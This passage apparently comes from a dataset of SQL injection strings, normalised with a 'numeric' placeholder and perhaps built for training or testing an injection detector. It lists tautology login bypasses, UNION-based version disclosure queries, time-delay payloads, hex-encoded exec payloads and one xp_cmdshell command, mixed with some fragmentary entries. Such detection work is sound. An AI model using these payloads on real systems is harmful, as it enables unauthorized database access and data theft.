       " ' select * from users where id = numeric<@$_ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@<@ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric%!<numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric| |numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id =numeric<@<@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@<@ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@<@ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numeric%!<@ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric<@&@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@$$ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric&@ or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' or ||/numeric= numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or  ( \\\\ )  = numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or  ( \\\\. )  = numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or  ( numeric)  = numericunion select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\.<\\\\ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\.<numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\.<\\\\ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\.<$ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\.<  = numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' ||numericunion select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric'   or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' ornumeric^ = numericunion select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $ . = numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $ numeric= numericor numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $ numeric= numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $<\\\\ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $<\\\\. union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $<\\\\ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or $+<$ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<\\\\. or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<\\\\. union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<numericor numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or !<numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<\\\\ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<$ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<$ union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or \\\\<  = numericunion select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or !<@ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' or !<@ union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or @ ( numeric)  = numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or @ numeric= numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' or @ @numeric= numericunion select numeric,version (  )  -- numeric'\",\n",
       " ' select * from users where id = numericor \" (  ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( ,\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( .\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" (numeric\" or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \" ( ;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( ]\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\" (  union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\" (  union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\" (  union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\" (  union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \" ( #\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( [\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( _\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\" (  = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\" (  = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \" ( &\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( @\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ( {\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" )  ( \" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) ,\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) .\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" )numeric\" or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \" ) ;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) ]\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) [\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) $\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) @\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \" ) {\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \", ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \", ) \" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \",,\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \",.\" or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \",;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \",?\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\", union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\", union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\", union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\", union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \",#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\", = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\", = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \",&\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \",{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \". ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \". ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \".,\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"..\" = numericor numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \".;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \".]\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\". union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\". union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\". union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\". union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \".#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \".[\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"._\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\". = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\". = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \".%\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \".@\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \".{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric( \" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric,\" or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"numeric;\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric]\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"numericunion select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"numericunion select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"numericunion select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"numeric#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric[\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric_\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric&\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"numeric{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = \\'numeric\\' or \"\"<@ union select numeric,version (  )  -- numeric\\'',\n",
       " '&1c',\n",
       " ' ( s',\n",
       " ' ) s',\n",
       " ',s',\n",
       " '.s',\n",
       " '1s',\n",
       " ';s',\n",
       " '?s',\n",
       " 'UE1',\n",
       " 'UEf',\n",
       " 'UEs',\n",
       " 'UEv',\n",
       " 'c',\n",
       " 'n',\n",
       " 'ns',\n",
       " 'os',\n",
       " 's',\n",
       " 'v',\n",
       " '{s',\n",
       " ' select * from users where id = numericornumeric#\"; or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"; ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"; ) \" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";,\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";.\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";\"numeric or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \";]\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"; union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"; union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"; union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"; union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \";#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";[\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";_\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\"; = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"; = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \";&\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = \\'numeric\\' union select \";\"_,version (  )  -- numeric\\'',\n",
       " ' select * from users where id = numericor \";@\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \";{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"? or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"? ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"] ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"?,\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = \\'numeric\\' union select $[\"],@@VERSION -- numeric\\'',\n",
       " ' select * from users where id = numericor \"].\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"]\"numeric or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"?;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"??\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"? union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"? union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"? union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"? union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"?#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"?[\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"?_\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"? = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"? = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"?%\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = \\'numeric\\' union select \"?\"_,version (  )  -- numeric\\'',\n",
       " ' select * from users where id = numericor \"?@\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"]{\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' union select ||/numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select  ( \\\\ ) ,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select  ( \\\\. ) ,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select  ( numeric) ,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select \\\\,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select \\\\.,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select \\\\.#,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select \\\\.%numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' union selectnumerica,banner from v$version where rownum = numeric-- numeric'\",\n",
       " ' select * from users where id = \\'numeric\\' union selectnumeric\"!\",banner from v$version where rownum = numeric-- numeric\\'',\n",
       " \" select * from users where id = 'numeric' union select \\\\#,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select $ .,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select $ _,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select $*$,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select +\\\\,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select +\\\\.,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select !<numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select +\\\\#,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select !<@,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select @ numeric,version (  )  --  numeric'\",\n",
       " \" select * from users where id = 'numeric'   union select null,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' union select @ @numeric,version (  )  --  numeric'\",\n",
       " ' select * from users where id = numericor \"\\\\#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$ ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"_ ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = \\'numeric\\' union select \"[\"_,version (  )  -- numeric\\'',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"_;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$?\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"$ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"$ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"$ union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"$ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"$#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$[\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$_\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$&\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"$@\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"_{\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' * ( \\\\ )  or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' +  ( \\\\ )  union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' +  ( \\\\. )  union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' * ( numeric)  union select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " ' select * from users where id = numericor \"& ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"& ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"%,\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric'<@.. or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric'<@.. union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@.$ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@._ union select numeric,version (  )  -- numeric'\",\n",
       " ' select * from users where id = numericor \"%.\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' +numeric||numericunion select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' *numericunion select numeric,banner from v$version where rownum = numeric-- numeric'\",\n",
       " ' select * from users where id = numericor \"%\"numeric or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"%;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"%?\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' + @<@# union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' *$ . or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' + $ . union select numeric,@@VERSION -- numeric'\",\n",
       " \" select * from users where id = 'numeric' *$ numericor numeric= numeric-- numeric'\",\n",
       " ' select * from users where id = numericor \"%[\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' <@$_ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@$_ union select numeric,version (  )  -- numeric'\",\n",
       " ' select * from users where id = numericor \"%_\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' + $+%\\\\ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@&numericor numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@&numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' <@<@ union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' + $+%$ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' + $+*$ union select numeric,@@VERSION -- numeric'\",\n",
       " ' select * from users where id = numericor \"%&\" or numeric= numeric--numeric',\n",
       " \" select * from users where id = 'numeric' <@&@ or numeric= numeric-- numeric'\",\n",
       " \" select * from users where id = 'numeric' %!<@ union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric'<@$$ union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' + @ ( numeric)  union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' + @ numericunion select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' + @numeric! union select numeric,version (  )  -- numeric'\",\n",
       " \" select * from users where id = 'numeric' + @ @numericunion select numeric,version (  )  -- numeric'\",\n",
       " ' select * from users where id = numericor \"%{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"@ ( \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"@ ) \" or numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"@;\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"@?\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"@ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"@ union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"@ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"@#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"@%\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{ ( \" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{ ) \" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{,\" = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{.\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{\"numeric = numericor numeric= numeric--numeric',\n",
       " 's',\n",
       " ' select * from users where id = numericor \"{;\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{?\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericornumeric#\"{ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"{ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"{ union select \\'a\\',version (  )  --numeric',\n",
       " ' select * from users where id = numericornumeric#\"{ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"{#\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\"{ = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor @#\"{ = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \"{%\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{@\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \"{{\" or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ @`\\\\` union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+ @<1# union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+ @<@. union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric-@<@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric-@<@ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numeric-@<@ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+ @<@# union select null,version (  )  --numeric',\n",
       " \"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"',\n",
       " 'or true--',\n",
       " '\" or true--',\n",
       " \"' or true--\",\n",
       " '\" )  or true--',\n",
       " \"' )  or true--\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' )  =  ( 'x\",\n",
       " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
       " '\" or \"x\" = \"x',\n",
       " '\" )  or  ( \"x\" )  =  ( \"x',\n",
       " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
       " 'or numeric=numeric',\n",
       " 'or numeric=numeric-- ',\n",
       " 'or numeric=numeric#',\n",
       " 'or numeric=numeric/*',\n",
       " \"admin' --\",\n",
       " \"admin' #\",\n",
       " \"admin'/*\",\n",
       " \"admin' or 'numeric' = 'numeric\",\n",
       " \"admin' or 'numeric' = 'numeric'--\",\n",
       " \"admin' or 'numeric' = 'numeric'#\",\n",
       " \"admin' or 'numeric' = 'numeric'/*\",\n",
       " \"admin'or numeric= numericor '' = '\",\n",
       " \"admin' or numeric=numeric\",\n",
       " \"admin' or numeric=numeric--\",\n",
       " \"admin' or numeric=numeric#\",\n",
       " \"admin' or numeric=numeric/*\",\n",
       " \"admin' )  or  ( 'numeric' = 'numeric\",\n",
       " \"admin' )  or  ( 'numeric' = 'numeric'--\",\n",
       " \"admin' )  or  ( 'numeric' = 'numeric'#\",\n",
       " \"admin' )  or  ( 'numeric' = 'numeric'/*\",\n",
       " \"admin' )  or 'numeric' = 'numeric\",\n",
       " \"admin' )  or 'numeric' = 'numeric'--\",\n",
       " \"admin' )  or 'numeric' = 'numeric'#\",\n",
       " \"admin' )  or 'numeric' = 'numeric'/*\",\n",
       " \" numeric  ' AND numeric= 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
       " 'admin\" --',\n",
       " 'admin\" #',\n",
       " 'admin\"/*',\n",
       " 'admin\" or \"numeric\" = \"numeric',\n",
       " 'admin\" or \"numeric\" = \"numeric\"--',\n",
       " 'admin\" or \"numeric\" = \"numeric\"#',\n",
       " 'admin\" or \"numeric\" = \"numeric\"/*',\n",
       " 'admin\"or numeric= numericor \"\" = \"',\n",
       " 'admin\" or numeric=numeric',\n",
       " 'admin\" or numeric=numeric--',\n",
       " 'admin\" or numeric=numeric#',\n",
       " 'admin\" or numeric=numeric/*',\n",
       " 'admin\" )  or  ( \"numeric\" = \"numeric',\n",
       " 'admin\" )  or  ( \"numeric\" = \"numeric\"--',\n",
       " 'admin\" )  or  ( \"numeric\" = \"numeric\"#',\n",
       " 'admin\" )  or  ( \"numeric\" = \"numeric\"/*',\n",
       " 'admin\" )  or \"numeric\" = \"numeric',\n",
       " 'admin\" )  or \"numeric\" = \"numeric\"--',\n",
       " 'admin\" )  or \"numeric\" = \"numeric\"#',\n",
       " 'admin\" )  or \"numeric\" = \"numeric\"/*',\n",
       " ' numeric  \" AND numeric= 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
       " \"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or numeric=numeric--\",\n",
       " '\"a\"\" or numeric=numeric--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " 'numericor numeric=numeric',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"numericwaitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000',\n",
       " 'declare @s varchar (  numeric  )  select @s  = ',\n",
       " '0x77616974666F7 numeric 064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e',\n",
       " 'exec ( @s ) ',\n",
       " \"a'\",\n",
       " '?',\n",
       " \"' or numeric=numeric\",\n",
       " '‘ or numeric= numeric--',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " \"x' AND email IS NULL; --\",\n",
       " \"anything' OR 'x' = 'x\",\n",
       " \"x' AND numeric=  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " ' numeric OR numeric=numeric',\n",
       " \"'; exec master..xp_cmdshell '172.10.1.255'--\",\n",
       " \"'\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " ' or x = x',\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " '0 or numeric=numeric',\n",
       " \"' or 0 = 0 --\",\n",
       " '\" or 0 = 0 --',\n",
       " 'or 0 = 0 --',\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " 'or 0 = 0 #',\n",
       " \"' or numeric=numeric--\",\n",
       " '\" or numeric=numeric--',\n",
       " \"' or 'numeric' = 'numeric'--\",\n",
       " \"' or numeric--'\",\n",
       " 'or numeric=numeric--',\n",
       " 'or numeric=numeric',\n",
       " 'or numeric= numeric--',\n",
       " \"' or numeric= numericor '' = '\",\n",
       " ' or numeric= numericor \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " ' )  or  ( a = a',\n",
       " 'hi or a = a',\n",
       " 'hi or numeric= numeric--\"',\n",
       " \"hi' or numeric= numeric--\",\n",
       " \"hi' or 'a' = 'a\",\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " '@variable',\n",
